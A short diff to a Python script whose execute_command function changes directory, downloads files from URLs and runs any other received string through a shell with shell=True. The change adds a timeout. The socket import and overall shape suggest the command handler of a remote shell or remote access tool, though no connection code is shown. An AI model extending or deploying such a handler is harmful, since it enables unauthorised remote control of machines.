@@ -2,8 +2,9 @@ import socket
 import subprocess
 import os
 import requests
+import time
 
-def execute_command(command):
+def execute_command(command, timeout=10):
     try:
         if command.startswith("cd "):  # Handle 'cd' command separately
             new_dir = command[3:].strip()
@@ -16,12 +17,31 @@ def execute_command(command):
             url = command[9:].strip()
             return download_file(url)
         else:
-            # Execute the command and capture the output
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            if result.returncode == 0:
-                return result.stdout
+            # Execute the command with a timeout
+            process = subprocess.Popen(
+                command,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            # Wait for the process to complete or timeout
+            start_time = time.time()
+            while process.poll() is None:  # While the process is still running
+                if time.time() - start_time > timeout:
+                    process.terminate()  # Terminate the process if it exceeds the timeout
+                    return f"Command timed out after {timeout} seconds."
+                time.sleep(0.1)  # Sleep to avoid busy-waiting
+
+            # Capture the output
+            stdout, stderr = process.communicate()
+            if stdout:
+                return stdout
+            elif stderr:
+                return f"Error: {stderr}"
             else:
-                return f"Error: {result.stderr}"
+                return "Command executed successfully (no output)."
     except Exception as e:
         return f"Exception: {str(e)}"
 
